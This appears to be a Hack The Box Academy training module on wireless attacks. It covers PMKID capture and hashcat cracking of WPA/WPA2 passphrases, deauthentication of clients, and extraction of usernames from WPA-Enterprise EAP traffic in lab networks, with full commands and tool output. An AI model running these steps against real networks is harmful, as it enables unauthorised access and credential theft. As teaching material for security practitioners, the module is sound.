      [00:00:00] 83/10303727 keys tested (626.74 k/s)

      Time left: 4 hours, 34 minutes, 0 seconds                  0.00%

                          KEY FOUND! [ <SNIP> ]

      Master Key     : 2B CF 5F 47 88 34 B7 14 66 50 16 C2 CE 8B 43 A6
                       88 BD 0B E4 71 D7 2B C6 3D AD 5A 3F 12 6B 4E D5

      Transient Key  : 98 F0 56 93 98 3F 41 F8 93 04 C5 CA 57 62 AE 52
                       D0 30 5A FE 7A 01 4C 15 4B 53 48 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : 15 57 98 06 85 99 8A DB A2 5F 05 54 D7 AE 8C 44


```


# PMKID Attack

* * *

The PMKID attack was discovered and brought to exploitable fruition by the [hashcat team](https://hashcat.net/forum/thread-7717.html). Unlike traditional handshake capture and brute-force methods that rely on the client de-authenticating and re-authenticating, the PMKID attack captures the PMKID directly without needing this interaction. The captured PMKID is then cracked. The PMKID vulnerability inherently exists due to PMK caching, and this attack is effective against both WPA and WPA2 protocols.

* * *

## PMK Caching and PMKID

Access Point (AP) roaming occurs when a client moves outside the range of an AP and connects to another AP. Similar to handoffs in cellular networks, this roaming can impact connectivity, as each time a client transitions between APs, a new 4-way handshake must be performed. Many routers store the `PMKID` from the initial exchange in a PMK Security Association (PMKSA) cache. This way, when a client disconnects and reconnects, the 4-way handshake doesn’t need to be repeated. Instead, the router directly requests the PMKSA from the client, verifies it, and then quickly re-associates the client with the access point.

```
	PMKSA = PMKID + Lifetime of PMK + MAC addresses + other variables

```

![image](https://academy.hackthebox.com/storage/modules/282/Personal/pmkid.png)

* * *

## How the PMKID is computed?

First, we generate the PMK with the pre-shared key and ESSID of the Access Point.

```
	PMK = PBKDF2(PSK, ESSID, 4096)

```

Then, once we have the PMK, we substitute it into the next algorithm to calculate the PMKID.

```
	PMKID = HMAC-SHA1-128(PMK, "PMK Name", AP-Mac, St-Mac)

```

In order to show this calculation, we can use the following python script.

```python
from pbkdf2 import PBKDF2
import binascii, hmac, hashlib, codecs

#First we need to declare the PSK and ESSID
PSK = 'VerySecurePassword'
ESSID = 'HTB-Wireless'

#Taking in the MAC addresses and converting to hex
APMac = '00:ca:12:11:12:13' #Access Point MAC Address
StMac = '00:ca:12:12:13:14' #Station MAC Address
#Removes :, converts to binary, then converts to hexadecimal
APMachex = binascii.hexlify(binascii.unhexlify(APMac.replace(':', '')))
StMachex = binascii.hexlify(binascii.unhexlify(StMac.replace(':', '')))

#Declares our message for the PMKID calculation
message = "PMK Name" + str(APMachex) + str(StMachex)

#Calculation of the PMK
pmk = PBKDF2(PSK, ESSID, 4096).read(32)

#Then we calculate the PMKID, we do so with hmac. The general syntax is hmac(key, msg,digestmod)
pmkid = hmac.new(pmk, message.encode('utf-8'), hashlib.sha1).hexdigest()

#This portion simply prints everything.
print("Basic PMKID Calculator")
print('Access Point Mac | ' + APMac + ' | ' + str(APMachex))
print('Station MAC | ' + StMac + ' | ' + str(StMachex))
print('Message: ' + str(message))
print('PMK: ' + str(pmk))
print('PMKID: ' + str(pmkid))

```

Now, we can run the script. Our PSK (password) in the script is "VerySecurePassword" and our ESSID is HTB-Wireless.

```shell
python3 PMKID_calc.py

Basic PMKID Calculator
Access Point Mac | 00:ca:12:11:12:13 | b'00ca12111213'
Station MAC | 00:ca:12:12:13:14 | b'00ca12121314'
Message: PMK Nameb'00ca12111213'b'00ca12121314'
PMK: b'\xf6\xf9{a\xe22\x8f\xe4[\xe7\xc5R`U\xb4a\xb3\xd0\xa8\xd3\xa2\x85/\x1d\xbc\xb7g\xbe2;\xd3\x8e'
PMKID: a6ddb59f88c8e902a4442cd7ef74d834adafbbcd

```

As shown, our example PMKID is `a6ddb59f88c8e902a4442cd7ef74d834adafbbcd`.

Unlike cracking a four-way handshake, generating the PMKID is less complex. As attackers, we can intercept the Access Point and Station MAC addresses, along with the ESSID, giving us three of the four primary inputs required to generate the PMKID. As a result, it requires less computational power to generate the PMKID versus cracking a traditional handshake. However, this may vary on a case-by-case basis.

`Retrieve PMKID` -\> `Guess Wi-Fi passphrase using dictionary` -\> `create PMK hash` -\> `create PMKID hash and compare with retrieved PMKID hash.`

The main advantage for this attack is that no regular users (clients) are required – because the attacker directly communicates with the AP (aka “client-less” attack)

* * *

## Performing the Attack

We begin by enabling monitor mode on our `wlan0` interface using `airmon-ng`.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

Once the interface is in monitor mode, the next step is to scan for the target network and determine if it is vulnerable to the PMKID attack. This can be done using [hcxdumptool](https://github.com/ZerBea/hcxdumptool), specifying the interface with the `-i` flag. To include relevant statuses in the command output, the `--enable_status` option is used, with three statuses being sufficient for most cases. Additionally, the `-o ` flag allows saving the scan results to a .pcap file for further analysis.

**Status Codes**:

1. EAPOL
2. ASSOCIATION and REASSOCIATION
3. EAPOL and ASSOCIATION and REASSOCIATION

## Scanning for Networks with PMKIDs

```shell
hcxdumptool -i wlan0mon --enable_status=3

initialization of hcxdumptool 6.2.5...
warning possible interfere: NetworkManager is running with pid 228

warning possible interfere: wpa_supplicant is running with pid 204

interface is already in monitor mode, skipping ioctl(SIOCSIWMODE) and ioctl(SIOCSIFFLAGS) system calls

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0mon
INTERFACE PROTOCOL........: IEEE 802.11
INTERFACE TX POWER........: 20 dBm (lowest value reported by the device)
INTERFACE HARDWARE MAC....: 020000000100 (not used for the attack)
INTERFACE VIRTUAL MAC.....: 020000000100 (not used for the attack)
DRIVER....................: htb80211_chipset
DRIVER VERSION............: 5.4.0-88-generic
DRIVER FIRMWARE VERSION...: N/A
openSSL version...........: 1.0
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 0 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: unused
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 48f317e382ad (BROADCAST HIDDEN used for the attack)
ACCESS POINT (ROGUE)......: 48f317e382ae (BROADCAST OPEN used for the attack)
ACCESS POINT (ROGUE)......: 48f317e382af (used for the attack and incremented on every new client)
CLIENT (ROGUE)............: e00db9c4a445
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 62130
ANONCE....................: 9f14624b2da3a4a721b7876507ebcf39bdeeadc841c256d386586ad2f89f7a39
SNONCE....................: 82fe602907686a6e1d605ec5baad3b704d9f3a5aeb65e9f78b8dbdf0bfc85838

19:00:20 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [ASSOCIATION]
19:00:20 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [PMKID:f296a698f65192290be9021be35e6462 KDV:2]
19:00:20 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [EAPOL:M1M2 EAPOLTIME:10099 RC:1 KDV:2]
19:00:20 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [EAPOL:M2M3 EAPOLTIME:65 RC:2 KDV:2]
19:00:20 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [EAPOL:M3M4ZEROED EAPOLTIME:50 RC:2 KDV:2]

```

As shown in the output above, we can see the `PMKID` for essid `HTBWireless`, confirming that the access point is indeed vulnerable. To proceed, we can use airodump-ng with `--essid HTBWireless` to find out the BSSID of our target.

```shell
airodump-ng wlan0mon --essid HTBWireless

 CH  3 ][ Elapsed: 0 s ][ 2024-09-08 12:26

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 E2:73:E7:F5:98:91  -47        3        0    0   1   54   WPA2 CCMP   PSK  HTBWireless

```

To ensure we only target our intended network (and avoid inadvertently attacking neighboring access points), we can refine our capture file. Start by using the `--enable_status` flag as before, then specify the target network's MAC address with the `--filterlist_ap` option. Additionally, set the appropriate filter mode and use the `-o` option to define where the captured PMKID should be saved.

## Capturing the Target's PMKID

```shell
hcxdumptool -i wlan0mon --enable_status=3 --filterlist_ap=E2:73:E7:F5:98:91 --filtermode=2 -o HTBPMKID.pcap

initialization of hcxdumptool 6.2.5...
warning possible interfere: NetworkManager is running with pid 228

warning possible interfere: wpa_supplicant is running with pid 204

interface is already in monitor mode, skipping ioctl(SIOCSIWMODE) and ioctl(SIOCSIFFLAGS) system calls

start capturing (stop with ctrl+c)
NMEA 0183 SENTENCE........: N/A
INTERFACE NAME............: wlan0mon
INTERFACE PROTOCOL........: IEEE 802.11
INTERFACE TX POWER........: 20 dBm (lowest value reported by the device)
INTERFACE HARDWARE MAC....: 020000000100 (not used for the attack)
INTERFACE VIRTUAL MAC.....: 020000000100 (not used for the attack)
DRIVER....................: htb80211_chipset
DRIVER VERSION............: 5.4.0-88-generic
DRIVER FIRMWARE VERSION...: N/A
openSSL version...........: 1.0
ERRORMAX..................: 100 errors
BPF code blocks...........: 0
FILTERLIST ACCESS POINT...: 1 entries
FILTERLIST CLIENT.........: 0 entries
FILTERMODE................: attack
WEAK CANDIDATE............: 12345678
ESSID list................: 0 entries
ACCESS POINT (ROGUE)......: 00269fffffce (BROADCAST HIDDEN used for the attack)
ACCESS POINT (ROGUE)......: 00269fffffcf (BROADCAST OPEN used for the attack)
ACCESS POINT (ROGUE)......: 00269fffffd0 (used for the attack and incremented on every new client)
CLIENT (ROGUE)............: f04f7c1c7fb1
EAPOLTIMEOUT..............: 20000 usec
EAPOLEAPTIMEOUT...........: 2500000 usec
REPLAYCOUNT...............: 62701
ANONCE....................: cfbcd5a7204d588f7f008c35e39d87e817f67ccfc235e94fa1c2f64e9d5c16fc
SNONCE....................: 6d9f57e1a3984db45cd8a7a02680a957a5ed1f1d9c9a44e9cfad77daeba4452d

19:01:38 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [PMKID:f196a698f65192290be9021be35e6462 KDV:2]
19:01:38 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [EAPOL:M1M2 EAPOLTIME:9607 RC:1 KDV:2]
19:01:38 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [EAPOL:M2M3 EAPOLTIME:89 RC:2 KDV:2]
19:01:38 2412/1   0e2e37d6886d d8d63deb29d5 HTBWireless [EAPOL:M3M4ZEROED EAPOLTIME:53 RC:2 KDV:2]

```

This would indicate successful capture of the PMKID. However, it can take quite a long time to capture the PMKID from the access point, but to speed things up, we can refresh the command by executing it again or alternatively specify additional flags.

If we absolutely want to ensure that we have successfully captured the PMKID, we can open our outputted capture file in Wireshark, add the `eapol` filter, and look under `message 1`. In here under `802.1X Authentication` -\> `WPA Key Data` -\> `Tag:`, we can see the RSN data for the PMKID. This should be the same as what was outputted in the terminal session from hcxdumptool. Similarly, the screenshot below shows what this process looks like.

## Analyzing the PMKID in Wireshark

![image](https://academy.hackthebox.com/storage/modules/172/wireshark/RSNPMKID/nonono.txt)

Once we have the PMKID captured into a pcap file, we need to convert it to a usable hash format for hashcat's `22000` option. We do so by using the `hcxpcapngtool` tool, which is part of [hcxtools](https://github.com/ZerBea/hcxtools).

## Converting the pcap to hash

```shell
hcxpcapngtool -o hash HTBPMKID.pcap

hcxpcapngtool 6.2.5 reading from HTBPMKID.pcap...

summary capture file
--------------------
file name................................: HTBPMKID.pcap
version (pcapng).........................: 1.0
operating system.........................: Linux 5.4.0-88-generic
application..............................: hcxdumptool 6.2.5
interface name...........................: wlan0mon
interface vendor.........................: 020000
openSSL version..........................: 1.0
weak candidate...........................: 12345678
MAC ACCESS POINT.........................: 50e14a262eb8 (incremented on every new client)
MAC CLIENT...............................: f0a2255a097a
REPLAYCOUNT..............................: 64168
ANONCE...................................: 957fbe3931e77aa91e562b41612e95dcb508071ad36db76288bab653bfbd4480
SNONCE...................................: f25daa2692b53615f0e37d20442542aa5c74c0b702cd18d5b8b37b9781d59a79
timestamp minimum (GMT)..................: 28.08.2024 21:41:37
timestamp maximum (GMT)..................: 28.08.2024 21:41:37
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianness (capture system)...............: little endian
packets inside...........................: 9
packets received on 2.4 GHz..............: 9
ESSID (total unique).....................: 1
BEACON (total)...........................: 1
BEACON (detected on 2.4 GHz channel).....: 1
AUTHENTICATION (total)...................: 2
AUTHENTICATION (OPEN SYSTEM).............: 2
ASSOCIATIONREQUEST (total)...............: 1
ASSOCIATIONREQUEST (PSK).................: 1
EAPOL messages (total)...................: 4
EAPOL RSN messages.......................: 4
EAPOLTIME gap (measured maximum usec)....: 10369
EAPOL ANONCE error corrections (NC)......: working
REPLAYCOUNT gap (recommended NC).........: 8
EAPOL M1 messages (total)................: 1
EAPOL M2 messages (total)................: 1
EAPOL M3 messages (total)................: 1
EAPOL M4 messages (total)................: 1
EAPOL pairs (total)......................: 2
EAPOL pairs (best).......................: 1
EAPOL pairs written to combi hash file...: 1 (RC checked)
EAPOL M32E2 (authorized).................: 1
PMKID (total)............................: 1
PMKID (best).............................: 1
PMKID written to combi hash file.........: 1

Warning: missing frames!
This dump file does not contain undirected proberequest frames.
An undirected proberequest may contain information about the PSK.
It always happens if the capture file was cleaned or
it could happen if filter options are used during capturing.
That makes it hard to recover the PSK.

Warning: missing frames!
This dump file does not contain enough EAPOL M1 frames.
It always happens if the capture file was cleaned or
it could happen if filter options are used during capturing.
That makes it impossible to calculate nonce-error-correction values.

session summary
---------------
processed pcapng files................: 1

```

We can inspect the hash to verify that it's the format we expect.

```shell
cat hash

WPA*01*cf7b81c9764f573c0fe30d21b40540d1*d8a63deb29d5*a234e93dcc12*485442***
WPA*02*8d2a1324dffc596883d96a1296fcb0d1*d8d33deb29d5*a234e93dcc12*485442*c1ba769069dbf4e21b72b20e706840d39e66905f8678d1736c6039381f048ff2*0103007502010a00000000000000000001c69f4dbef776505c95506cc6367c312647490089daeb4106b213dc02ae29441c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac028000*02

```

To crack the hash, we use the `-m 22000` option in Hashcat, followed by the hash file and the wordlist we want to use for the brute-force attack.

## Cracking the Hash

```shell
hashcat -m 22000 --force hash /opt/wordlist.txt

hashcat (v6.2.5) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-AMD EPYC 7302P 16-Core Processor, 1433/2930 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

INFO: All hashes found in potfile! Use --show to display them.

Started: Thu Aug 29 21:35:09 2024
Stopped: Thu Aug 29 21:35:09 2024

```

If **Hashcat** does not work within the provided attacker VM, it is recommended to use **Pwnbox** or your **local VM** to run Hashcat.

Once Hashcat successfully cracks the PSK, we can rerun the same command with the `--show` argument to display the cracked password.

```shell
hashcat -m 22000 --force hash /opt/wordlist.txt --show

cf3b81c9764f573c0fe30d21b40540d1:d8d63deb29d5:a234e93dcc12:HTBWireless:<SNIP>
8d4a1324dffc596883d96a1296fcb0d1:d8d63deb29d5:a234e93dcc12:HTBWireless:<SNIP>

```

Note: WPA/WPA2-PSK PMKID attacks can be mitigated by disabling Fast Roaming features on the access point (Router).


# WPA Enterprise Overview

* * *

WPA/WPA2 Enterprise (MGT) is a robust security protocol that provides secure wireless access for organizations by leveraging individual user authentication, RADIUS integration, and various EAP methods. Its ability to centralize user management and ensure secure credential transmission makes it a preferred choice for enterprise environments, despite its complexity and associated costs. By implementing WPA Enterprise, organizations can significantly enhance their wireless network security and protect sensitive data from unauthorized access. On a WPA2-Enterprise network, all devices have their own unique set of credentials to access the network instead of sharing a single password. Because routers can’t store all these sets of login information, an authentication server called a RADIUS server is required. The RADIUS server verifies that the credentials of each user are valid by referencing a separate directory with user and device information.

WPA/WPA2 Enterprise utilizes 802.1x authentication in order to authenticate clients to the network. The process generally involves two key steps:

1. Open System Authentication (Authentication and Association)
2. 802.1x Authentication through either EAP, PEAP, or TTLS

The key difference between WPA-Personal and WPA-Enterprise lies in how session keys are handled. In WPA-Enterprise, the initial connection process involves three parties: the `client`, the `access point`, and the `RADIUS` server, which work together to negotiate a unique session key for establishing a secure data connection. Unlike WPA-Personal, which relies on a common pre-shared key, WPA-Enterprise assigns each user a unique session identity, making the process more secure. Consequently, cracking WPA-Enterprise differs from cracking WPA/WPA2-Personal, where methods like capturing the `PMKID` or `EAPOL` (4-Way Handshake) are commonly used. In WPA-Enterprise, each user is authenticated with their own unique `username` and `password`.

* * *

## Authentication Framework

In WPA/WPA2-Enterprise, the authentication framework used is known as EAP (Extensible Authentication Protocol).

### Extensible Authentication Protocol (EAP)

Extensible Authentication Protocol (EAP) is a framework widely used in wireless networks and point-to-point connections to provide a flexible method for authentication. Instead of defining a specific way to authenticate, EAP supports a variety of authentication methods or "types," allowing it to adapt to different security requirements. EAP is often used in WPA/WPA2-Enterprise environments where authentication is more complex and robust than just using a pre-shared key (PSK). EAP is not a standalone protocol but a framework that allows for different authentication methods. It operates over lower-layer protocols like IEEE 802.1X, making it suitable for network access authentication.

* * *

## Authentication Methods

There are numerous authentication methods available in WPA2 enterprise environment, but the most commonly used in major organizations are PEAP, TTLS, and TLS. These methods are favored for their robust security and effectiveness in protecting sensitive information during authentication processes.

### Protected Extensible Authentication Protocol (PEAP)

Protected Extensible Authentication Protocol (PEAP) is an extension of the Extensible Authentication Protocol (EAP) designed to provide enhanced security for user authentication in wireless networks. PEAP is widely used in WPA/WPA2-Enterprise environments, where it creates a secure, encrypted tunnel between the client and the authentication server before transmitting credentials.

Two Phases of PEAP Authentication:

1. `Phase 1 (Outer Authentication)`: PEAP begins by establishing a TLS tunnel, ensuring that the communication between the client and the server is encrypted. This phase requires the server to have a digital certificate to authenticate itself to the client.
![PEAP](https://academy.hackthebox.com/storage/modules/282/Enterprise/peap-1.png)

2. `Phase 2 (Inner Authentication)`: Once the encrypted tunnel is established, PEAP transmits the user’s actual authentication credentials securely through this tunnel. Common methods used in this phase include:
   - `EAP-MSCHAPv2`: A popular method using username and password for authentication.
   - `EAP-GTC`: Allows token-based authentication.
     ![PEAP](https://academy.hackthebox.com/storage/modules/282/Enterprise/peap-2.png)

### Tunneled Transport Layer Security (TTLS)

Tunneled Transport Layer Security (TTLS) is an authentication protocol that extends the functionality of the Extensible Authentication Protocol (EAP). Like Protected EAP (PEAP), TTLS establishes a secure, encrypted tunnel between the client and the authentication server before transmitting user credentials. It is primarily used in enterprise environments for wireless and wired network authentication, providing flexibility in the choice of inner authentication methods.

### Transport Layer Security (TLS)

TLS (Transport Layer Security) employs Public Key Infrastructure (PKI) to authenticate clients and servers, ensuring a secure connection to a RADIUS authentication server or other types of authentication servers. This method is widely recognized for its robust security, as it requires both the client and server to present valid `digital certificates` during the authentication process. It is commonly used in high-security environments, such as enterprises and government organizations, where strong security is essential.

* * *

## 802.1x Authentication Types

There are two types of authentication in WPA-Enterprise:

1. `Username & Password Authentication (UPA)`: This method requires users to authenticate using a unique username and password combination.
2. `Certificate-Based Authentication (CBA)`: In this approach, authentication is done using digital certificates, which are typically issued to users or devices to ensure secure access.

### Username & Password Authentication (UPA)

In WPA/WPA2-Enterprise, Username and Password Authentication (UPA) is implemented through specific authentication frameworks that support the use of credentials (username and password) for network access. This is typically achieved using protocols like EAP, PEAP, or EAP-TTLS, which encapsulate username and password exchanges within a secure tunnel, protecting them from eavesdropping or interception during the authentication process.

![WPA](https://academy.hackthebox.com/storage/modules/282/Enterprise/wpa_auth_1.png)

Here is a table showing different authentication types for WPA-Enterprise based on EAP (Extensible Authentication Protocol):

| Method | Description |
| --- | --- |
| `EAP-FAST` | It utilizes a Protected Access Credential (PAC) to establish a secure TLS tunnel for verifying client credentials. |
| `EAP-GTC` | It involves a text challenge issued by the authentication server, accompanied by a response generated by a security token. |
| `EAP-MD5` | It is unique among EAP methods as it only authenticates the EAP peer to the EAP server, lacking mutual authentication between the two parties. |
| `EAP-MSCHAPv2` | It requires both the client and the RADIUS server to demonstrate knowledge of the user's password for the authentication process to be successful. |
| `PEAP-MD5` | It enables a RADIUS server to authenticate LAN stations by verifying an MD5 hash of each user's password. |
| `PEAP-GTC` | It was developed by Cisco to ensure interoperability with existing token card and directory-based authentication systems through a secure, protected channel. |
| `PEAP-MSChapV2` | It is one of the most widely used forms of PEAP. It employs MSCHAPv2, allowing it to authenticate against databases that support this format, such as Microsoft NT and Microsoft Active Directory. |
| `TTLS-PAT` | It allows the client to initiate the authentication process by tunneling the User-Name and User-Password Attribute-Value Pairs (AVPs) to the TTLS server. |
| `TTLS-CHAP` | It securely tunnels client password authentication within TLS records. The client initiates the MS-CHAP process by sending the User-Name, MS-CHAP-Challenge, and MS-CHAP. |
| `TTLS-MSCHAP` | It securely tunnels client password authentication and the MSCHAP response within TLS records. The client initiates the MS-CHAP process by tunneling the User-Name, MS-CHAP-Challenge, and MS-CHAP-Response Attribute-Value Pairs (AVPs) to the TTLS server. |
| `TTLS-MSCHAPv2` | It securely tunnels client password authentication and the MSCHAPv2 response within TLS records. The client initiates the MS-CHAP process by tunneling the User-Name, MS-CHAP-Challenge, and MS-CHAP-Response Attribute-Value Pairs (AVPs) to the TTLS server. |
| `TTLS-EAP-MD5` | It securely tunnels the MD5 hash within the TLS records for client authentication. |
| `TTLS-EAP-GTC` | It securely tunnels the GTC token within the TLS records for authentication purposes. |
| `TTLS-EAP-MSCHAPv2` | It securely tunnels client password authentication and the MSCHAPv2 response within TLS records. The client initiates the MS-CHAP process by tunneling the User-Name, MS-CHAP-Challenge, and MS-CHAP-Response Attribute-Value Pairs (AVPs) to the TTLS server. |

### Certificate-Based Authentication (CBA)

Certificate-Based Authentication (CBA) in WPA/WPA2-Enterprise is a robust authentication method that enhances security by utilizing digital certificates to authenticate users and devices connecting to a network. Unlike Username and Password Authentication (UPA), which relies on user credentials, CBA uses cryptographic certificates to establish trust between the client and the network.

![WPA](https://academy.hackthebox.com/storage/modules/282/Enterprise/wpa_auth_2.png)

| Method | Description |
| --- | --- |
| `EAP-TLS` | It is an open standard that employs the TLS (Transport Layer Security) protocol to secure communications. It utilizes Public Key Infrastructure (PKI) for authenticating clients and servers, ensuring a secure connection to a RADIUS authentication server or similar authentication systems. |
| `PEAP-TLS` | It is similar to EAP-TLS but offers enhanced security by encrypting portions of the certificate that are unencrypted in EAP-TLS. |
| `TTLS-EAP-TLS` | It securely tunnels the EAP-TLS certificate within TLS records, ensuring that the certificate remains protected during the authentication process. |

* * *

## Attacking WPA/WPA2 Enterprise Authentication

There are two main ways to attack WPA-Enterprise:

1. `Brute-force Attack`: This method involves systematically guessing the username and password to crack the network. Attackers use automated tools to try multiple combinations until the correct credentials are found.
2. `Evil Twin Attack`: In this method, attackers set up a rogue access point (evil twin) that mimics the legitimate network. When users connect to the fake access point, their credentials can be captured. If the network uses UPA (Username & Password Authentication), attackers can retrieve either clear-text credentials or hashed passwords. For networks using CBA (Certificate-Based Authentication), attackers can still perform other types of attacks—such as hosting fake captive portals or phishing pages, DNS spoofing, or SSL stripping—once the client connects to the rogue access point with a certificate.

To perform a brute-force attack on a WPA2-Enterprise network, tools such as Air-Hammer or EAPHammer can be utilized effectively. If the brute-force attack fails, the next step to effectively retrieve credentials from end users is to implement an evil-twin attack with a RADIUS server. Our objective is to replicate as many attributes as possible from the target network, enabling clients to connect to our network and undergo the same authentication process they would with the legitimate access point. During this process, users must disclose their identity (user ID) and hashed password to join the network. Cracking the hashed password is typically faster and more practical than attempting to crack the Client Session Key (CSK).

There are many aspects to consider when employing the evil-twin attack that could allow it to be more effective. These are:

![PEAP](https://academy.hackthebox.com/storage/modules/282/Enterprise/evil-twin.png)

1. How close are we physically to the targeted station (client/victim)?
2. What 802.1x authentication method is the access point using?
3. Is the access point using client-side SSL certificates (EAP-TLS/PEAP-TLS/TTLS-EAP-TLS)?
4. Is there a wireless intrusion detection or prevention system that will detect our actions?

* * *

## Moving On

In the upcoming sections, we will conduct an in-depth exploration of two methods for attacking WPA-Enterprise: `brute-force attacks` and `evil-twin attacks`. We will examine how to set up different evil-twin configurations for various authentication methods. For instance, EAP-MSCHAPv2 will yield an NTLM hash of the password, while certificate-based authentication (EAP-TLS) offers enhanced security, necessitating the identification of poorly configured clients that can be exploited.


# WPA Enterprise Reconnaissance

* * *

WPA Enterprise is built on the 802.1X framework, which utilizes RADIUS and EAP (Extensible Authentication Protocol) to provide robust authentication for mid-sized enterprise networks. When scanning for available Wi-Fi networks with tools like `airodump-ng`, encountering an authentication type labeled as `MGT` indicates that the network is configured with WPA Enterprise.

```shell
sudo airmon-ng start wlan0

Found 2 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    559 NetworkManager
    798 wpa_supplicant

PHY     Interface       Driver          Chipset

phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)

```

```shell
airodump-ng wlan0mon -c 1

 CH  1 ][ Elapsed: 36 s ][ 2024-08-23 10:19 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100      372       77    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  9A:B7:A6:32:F3:D6  -29    9 -48      0       95  PMKID  HTB-Corp

```

* * *

## PMK Caching and PMKID

The Pairwise Master Key Identifier (PMKID) is a unique identifier generated during the security association between a client and an access point (AP) using the Pairwise Master Key (PMK). PMKID plays a crucial role in facilitating faster reconnections for clients. When a client initially connects to an AP (let’s call it AP1) and later moves out of its range, the PMKID allows the client to skip the full EAP handshake if it reconnects to the same AP (AP1). This is achieved by including the cached PMKID in the (Re)association request when the client returns within the range of AP1, streamlining the reconnection process. The PMKCacheTTL, which determines how long a Pairwise Master Key (PMK) is stored in the cache, has a default value of 720 minutes according to [Microsoft](https://learn.microsoft.com/en-us/uwp/schemas/mobilebroadbandschema/wlan/element-pmkcachettl). This setting applies to WPA2 networks where PMKCacheMode is enabled, and it can be adjusted to any value between 5 and 1440 minutes.

![PMH_Caching](https://academy.hackthebox.com/storage/modules/282/Enterprise/pmk_caching.png)

From an EAP handshake, we can extract several critical details, including the `username`, `domain name`, and `handshake certificate`. If PMK caching is disabled on the access point (AP), we can force clients to perform a full EAP handshake by carrying out a deauthentication attack, disconnecting them, and prompting a reconnect. However, if PMK caching is enabled, we would need to wait for the PMK cache to expire before clients are required to complete a full EAP handshake again. The cache expiration time can range from 5 to 1440 minutes, depending on the configured PMKCacheTTL value.

To start capturing WPA handshake data, we can use `airodump-ng` with the `-w WPA` argument to save the scan output into a file with the WPA prefix. This process will create a `WPA-01.cap` file, which will automatically update with new data as the scan continues. Here's the command:

```shell
airodump-ng wlan0mon -c 1 -w WPA

 CH  1 ][ Elapsed: 36 s ][ 2024-08-23 10:19 ]

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 9C:9A:03:39:BD:7A  -28 100      372       77    0   1   54   WPA2 CCMP   MGT  HTB-Corp

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 9C:9A:03:39:BD:7A  9A:B7:A6:32:F3:D6  -29    9 -48      0       95  PMKID  HTB-Corp

```

```shell
aireplay-ng -0 1  -a 9C:9A:03:39:BD:7A -c 9A:B7:A6:32:F3:D6 wlan0mon

19:41:12  Waiting for beacon frame (BSSID: 9C:9A:03:39:BD:7A) on channel 1
19:41:12  Sending 64 directed DeAuth (code 7). STMAC: [9A:B7:A6:32:F3:D6] [ 0| 0 ACKs]

```

Note: A full EAP handshake will be captured through a deauthentication attack only if the PMK cache is disabled on the access point (AP). If PMK caching is enabled, the client may use the cached PMKID to reconnect without performing the full EAP handshake. In this case, the handshake capture will not occur, and we would have to wait for the PMK cache TTL to expire.


Once we have captured the WPA handshake, we can use the `WPA-01.cap` file to extract important details such as the username, domain name, and handshake certificate from the captured data.

* * *

## Finding the Domain and Username

To identify the username used by the client, we can open the `WPA-01.cap` file in Wireshark and apply a filter for `eap`. This will show packets related to the Extensible Authentication Protocol (EAP).

We can look for a packet labeled as `Response, Identity`. Within this packet, we should see the username in the format `Domain\Username`. For example, the username is displayed as `HTB\Ketty`, this indicates that `HTB` is the domain's DNS name (Also known as NETBIOS name) and `Ketty` is the username.

![image](https://academy.hackthebox.com/storage/modules/282/Enterprise/wpaep_username.png)

We can also use [tshark](https://www.wireshark.org/docs/man-pages/tshark.html) to extract potential usernames from the WPA-01.cap file. The following command demonstrates how this can be done:

```shell
tshark -r WPA-01.cap -Y '(eap && wlan.ra == 9c:9a:03:39:bd:7a) && (eap.identity)' -T fields -e eap.identity

Running as user "root" and group "root". This could be dangerous.
HTB\Ketty

```

